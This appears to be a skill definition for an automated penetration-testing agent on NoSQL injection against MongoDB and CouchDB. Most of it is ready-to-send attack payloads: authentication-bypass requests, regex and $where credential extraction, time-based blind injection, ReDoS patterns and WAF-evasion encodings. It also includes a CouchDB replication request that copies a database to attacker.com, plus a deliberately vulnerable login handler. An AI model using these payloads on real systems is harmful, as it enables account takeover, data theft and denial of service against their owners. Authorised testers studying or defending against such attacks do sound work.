---
name: nosql-injection
description: "NoSQL injection exploitation for MongoDB, CouchDB, and other document databases including operator injection"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["nosql injection", "mongodb injection", "nosql injection", "nosql attack", "document database injection", "operator injection", "mongodb operator", "nosql authentication bypass", "couchdb injection", "database injection nosql"]
contextBoosts: [sqli]
mitreAttack: ["T1190", "T1059"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
---

# NoSQL Injection — Document Database Exploitation

## When to Use

- Target accepts JSON request bodies with database queries
- API endpoints reflect data from MongoDB, CouchDB, Couchbase, or Elasticsearch
- Login/registration forms that connect to document databases
- Parameters are passed as JSON objects (not just strings)
- URL parameters are parsed as JSON (e.g., `?filter={"$ne":""}`)
- Application returns database errors mentioning BSON, ObjectId, or MongoError
- Evidence of Mongoose, Monk, mongoose-sanitize, or `express-mongo-sanitize` absent
- Parameter type hints suggest objects, arrays, or nested structures
- Server-side template rendering with document database backends

## Do Not Use

- Target is a relational database (MySQL, PostgreSQL, SQLite) — use SQL injection skill instead
- No evidence of document database backend
- Input is strictly validated with type checking (e.g., `typeof value === 'string'`)
- ORM/ODM performs parameterized queries (Mongoose with proper schema validation)
- `mongo-sanitize` or equivalent middleware is confirmed active
- Response content type is `text/html` with no dynamic data binding
- Application uses prepared statements equivalent for NoSQL (e.g., Mongoose `find()` with plain objects)

## Auth Context

NoSQL injection is most impactful when it bypasses authentication. Document databases store credentials as JSON fields, and naive query construction allows operators to alter query logic. The attacker replaces string values with operator objects that evaluate to true for multiple records. This differs from SQL injection — there are no `UNION` or `DROP` statements. Instead, exploit query operators (`$ne`, `$gt`, `$regex`) to manipulate boolean logic.

Authentication bypass works because `{"username": {"$ne": ""}, "password": {"$ne": ""}}` matches any document where both fields are non-empty — typically all users. The database returns the first match, which may be the admin account. This is the most common and reliable NoSQL injection vector.

---

## MongoDB Operator Injection

### Core Concept

MongoDB queries accept operator objects. When application code constructs a query from user input without type validation, an attacker can inject operators.

**Vulnerable pattern (Node.js/Express):**

```javascript
// VULNERABLE — req.body is passed directly to find()
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne(req.body);
  if (user) return res.json({ success: true, user });
  res.status(401).json({ success: false });
});
```

**Attack payload:**

```json
POST /login
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Result:** Query becomes `db.users.findOne({username: {$ne: ""}, password: {$ne: ""}})` — matches any user with non-empty credentials.

### Operator Reference

| Operator | Purpose | Injection Example |
|----------|---------|-------------------|
| `$ne` | Not equal | `{"$ne": ""}` — matches any non-empty value |
| `$gt` | Greater than | `{"$gt": ""}` — matches any value greater than empty string |
| `$lt` | Less than | `{"$lt": "\xff"}` — matches any value less than 0xFF |
| `$gte` | Greater or equal | `{"$gte": ""}` — matches all non-null values |
| `$lte` | Less or equal | `{"$lte": "\xff"}` — matches everything |
| `$regex` | Pattern match | `{"$regex": ".*"}` — matches any string |
| `$exists` | Field existence | `{"$exists": true}` — matches if field exists |
| `$in` | In array | `{"$in": ["admin", "root"]}` — matches listed values |
| `$nin` | Not in array | `{"$nin": []}` — matches everything |
| `$not` | Negation | `{"$not": {"$regex": "^$"}}` — matches non-empty |
| `$where` | JavaScript eval | `{"$where": "true"}` — always true (slow) |
| `$expr` | Aggregation expr | `{"$expr": {"$gt": [1, 0]}}` — always true |

### Data Extraction with Operators

**Extract all usernames:**

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Enumerate specific field values using regex:**

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

Increment the first character (`a`, `b`, `c`, ...) to enumerate usernames character by character.

**Extract password length:**

```json
{"username": "admin", "password": {"$regex": "^.{8}$"}}
```

Adjust the length pattern until a match is found.

**Extract ObjectId (known format — 24 hex chars):**

```json
{"_id": {"$regex": "^[0-9a-f]{24}$"}}
```

---

## JSON Parameter Injection

When URL parameters are parsed as JSON, inject operators directly in query strings.

**Vulnerable endpoint:**

```
GET /api/users?filter={"name":"admin"}
```

**Attack:**

```
GET /api/users?filter={"name":{"$ne":""}}
```

**For login bypass via GET:**

```
GET /api/login?username=admin&password[0][$ne]=&password[1][$ne]=
```

**Another variant — nested object injection:**

```
GET /api/user?query={"$where":"this.role==='admin'"}
```

The server-side `JSON.parse()` on the query string converts the parameter to a proper MongoDB operator object before passing it to the database driver.

---

## Array Parameter Injection

When frameworks (e.g., Express with `qs` library) parse query strings, bracket notation creates nested objects.

**Basic array injection:**

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=&password[$type]=string
```

**Express `qs` parsing produces:**

```json
{"username": "admin", "password": {"$ne": "", "$type": "string"}}
```

**Double-nested:**

```
username[$ne]=&password[$ne]=
```

Produces: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`

**Type restriction bypass:**

```
username=admin&password[$ne]=&password[$type]=string
```

This ensures the `$ne` operator only matches string-type fields, avoiding ObjectId or array matches that could cause errors.

---

## Authentication Bypass

### Direct Bypass

```json
POST /api/auth/login
Content-Type: application/json

{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

### Username Enumeration + Targeted Bypass

```json
POST /api/auth/login
Content-Type: application/json

{
  "username": {"$regex": "^admin"},
  "password": {"$ne": ""}
}
```

### Passwordless Bypass (username known)

```json
POST /api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": {"$ne": ""}
}
```

### Bypass with `$in` (target multiple accounts)

```json
POST /api/auth/login
Content-Type: application/json

{
  "username": {"$in": ["admin", "administrator", "root", "superadmin"]},
  "password": {"$ne": ""}
}
```

### Bypass via `$exists`

```json
POST /api/auth/login
Content-Type: application/json

{
  "username": {"$exists": true},
  "password": {"$exists": true}
}
```

Matches any document where both fields exist — effectively all valid users.

---

## MongoDB JavaScript Injection

MongoDB supports `$where` clauses that execute JavaScript. This is the NoSQL equivalent of SQL injection — it allows arbitrary code execution within the MongoDB engine.

### Basic `$where` Injection

```json
{"$where": "this.password.length > 0"}
```

### Boolean-Based Extraction

```json
{"$where": "this.password.charAt(0) === 'a'"}
```

Iterate over characters to extract password values.

### Conditional Sleep (Blind Extraction)

```json
{"$where": "if(this.password.charAt(0)==='a'){sleep(5000); return true; } return false;"}
```

> **Note:** `sleep()` is not available in all MongoDB versions. Use `db.getReplicationInfo()` or serverStatus-based timing as an alternative.

### Data Exfiltration via `$where`

```json
{"$where": "this.role === 'admin'"}
```

```json
{"$where": "Object.keys(this).forEach(function(k){if(k==='password'){/* field exists */}})"}
```

### `$where` with `$regex` (Combined)

```json
{"$where": "this.username.match(/^admin/) !== null"}
```

### ⚠️ `$where` Performance Warning

`$where` executes JavaScript for every document. On large collections, this is slow and detectable. Use operators (`$ne`, `$gt`, `$regex`) first. Reserve `$where` for blind scenarios where operators alone cannot extract data.

---

## Regex DoS (ReDoS)

MongoDB `$regex` is vulnerable to catastrophic backtracking with crafted patterns. If the application passes user input into a regex query, an attacker can cause server-side denial of service.

### Basic ReDoS Pattern

```json
{"username": {"$regex": "^(a+)+$"}}
```

This pattern causes exponential backtracking in most regex engines. The MongoDB server processes this against every document, amplifying the CPU cost.

### Variants

```json
{"email": {"$regex": "^(a|a)+$"}}
```

```json
{"name": {"$regex": "^(a|a?)+$"}}
```

```json
{"search": {"$regex": "(a|aa)+"}}
```

### Detection

- Send a ReDoS pattern and measure response time
- Compare with a benign regex on the same endpoint
- Significant time difference (seconds vs milliseconds) confirms vulnerability
- Check if the endpoint returns 500 or timeout errors under load

### Impact

- MongoDB server CPU spikes to 100%
- All queries to the affected collection slow down
- Application-wide denial of service if connection pool is exhausted
- Potential crash in extreme cases with large collections

---

## CouchDB Specific

CouchDB exposes a REST API with query capabilities. Injection vectors differ from MongoDB.

### `_all_docs` Enumeration

```
GET /{database}/_all_docs?include_docs=true&limit=100
```

If the application does not restrict this endpoint, all documents are enumerable.

### `_find` (Mango Query) Injection

CouchDB `_find` accepts Mango query JSON. If user input reaches the query body:

```json
POST /{database}/_find
Content-Type: application/json

{
  "selector": {
    "username": {"$ne": ""},
    "password": {"$ne": ""}
  }
}
```

### Mango Query Operators

| Operator | Example |
|----------|---------|
| `$ne` | `{"field": {"$ne": "value"}}` |
| `$gt` | `{"field": {"$gt": ""}}` |
| `$lt` | `{"field": {"$lt": "\uffff"}}` |
| `$regex` | `{"field": {"$regex": ".*"}}` |
| `$exists` | `{"field": {"$exists": true}}` |
| `$in` | `{"field": {"$in": ["admin","root"]}}` |
| `$and` | `{"$and": [{"a":{"$ne":""}}, {"b":{"$ne":""}}]}` |
| `$or` | `{"$or": [{"role":"admin"}, {"role":"superadmin"}]}` |

### CouchDB Authentication Bypass

```
POST /{database}/_find
Content-Type: application/json

{
  "selector": {
    "type": "user",
    "name": {"$ne": ""},
    "password": {"$ne": ""}
  },
  "limit": 1
}
```

### CouchDB `_utils` Access

Check for Futon/FTUX admin interface:

```
GET /_utils/
GET /_utils/index.html
```

If accessible, provides direct database access without injection.

### CouchDB `_changes` Feed

```
GET /{database}/_changes?include_docs=true&limit=100
```

Reveals document changes — useful for extracting recent data without knowing document IDs.

### CouchDB `dbcopy` / `replicate`

If admin access is achieved:

```json
POST /_replicate
Content-Type: application/json

{
  "source": "target_db",
  "target": "http://attacker.com/leaked_db",
  "create_target": true
}
```

---

## Time-Based Blind NoSQL Injection

When responses do not reflect injected data, use timing to infer results.

### MongoDB `$where` Sleep

```json
{"$where": "if(this.username==='admin'){var start=new Date();while((new Date()-start)<5000){}} return true;"}
```

> **Note:** `sleep()` is not standard in all MongoDB deployments. CPU-bound loops work but may trigger watchdog termination.

### `$regex` Timing

Complex regex patterns cause measurable delays:

```
{"username": {"$regex": "^admin.*"}}
```

Response time increases with pattern complexity and collection size.

### CouchDB Mango Timing

```json
{
  "selector": {
    "$where": "function(){ var start = Date.now(); while(Date.now()-start < 5000){} return true; }"
  }
}
```

> **Note:** CouchDB `_find` does not support `$where`. Use field existence checks with timing via network-level delays.

### Inference Process

1. Send baseline request — measure response time (T0)
2. Send condition-true payload — measure time (T1)
3. Send condition-false payload — measure time (T2)
4. If T1 >> T0 and T2 ≈ T0, condition is true
5. Repeat with different conditions to extract data bit by bit

---

## Evasion and WAF Bypass

### Content-Type Switching

Try `application/x-www-form-urlencoded` with bracket notation instead of JSON:

```
username[$ne]=&password[$ne]=
```

Or `multipart/form-data`:

```
------WebKitFormBoundary
Content-Disposition: form-data; name="username[$ne]"

------WebKitFormBoundary
Content-Disposition: form-data; name="password[$ne]"

------WebKitFormBoundary--
```

### Encoding Bypass

URL-encode operators:

```
%7B%22username%22%3A%7B%22%24ne%22%3A%22%22%7D%7D
```

Double-encode for bypass:

```
%257B%2522username%2522%253A%257B%2522%2524ne%2522%253A%2522%2522%257D%257D
```

### Unicode Encoding

```json
{"username": {"\u0024ne": ""}}
```

```json
{"username": {"＄ne": ""}}
```

### Alternate Representations

```json
{"username": {"$not": {"$eq": ""}}}
```

```json
{"username": {"$nin": [""]}}
```

```json
{"username": {"$or": [{"$gt": ""}, {"$lt": ""}]}}
```

---

## Detection and Fingerprinting

### Identify Document Database Backend

- Error messages containing `BSON`, `ObjectId`, `MongoError`, `MongooseError`
- Response headers: `X-Powered-By: Express`, `X-MongoDB-Session`
- Default `ObjectId` patterns in responses (24-char hex strings)
- API endpoints using `/api/` prefix with JSON bodies
- `_id` fields in responses instead of `id` (auto-generated ObjectId)

### Confirm Vulnerability

1. Send `{"test": 1}` — check for type error (confirms JSON parsing)
2. Send `{"$ne": ""}` as a single field value — check for operator processing
3. Send `{"username": {"$ne": ""}}` — check if query logic is affected
4. Compare response content/length between `{"$ne": ""}` and `{"$eq": "nonexistent"}`
5. Monitor response time with ReDoS patterns

---

## Anti-Hallucination

### What NOT to Claim

- Never claim injection succeeded without verifiable evidence (response difference, data leak, error message)
- Never claim `$where` code execution without timing evidence or explicit error output
- Never claim database version or engine from generic errors alone
- Never claim data extraction without showing the extracted values in the response
- Never assume `sleep()` is available — test for it or use CPU-bound timing alternatives
- Never claim RCE — `$where` runs in the MongoDB JavaScript engine sandbox, not the OS

### What Constitutes Evidence

- Observable difference in response body/length/status between true and false conditions
- Time-based confirmation: condition-true takes measurably longer than condition-false
- Error messages that reveal query structure or database internals
- Extracted data that appears in the response (not inferred from response length alone)
- Database-specific error codes (e.g., MongoDB error code 2, 14, 10030, 51003)

### Validation Checklist

- [ ] Confirm JSON body is parsed (send `{"test": 1}` and check response)
- [ ] Confirm operator objects are processed (send `{"$ne":""}` and compare response)
- [ ] Confirm data extraction matches actual response content
- [ ] Confirm timing is consistent across multiple requests (>3 repeats)
- [ ] Confirm no `mongo-sanitize` or equivalent is stripping operators
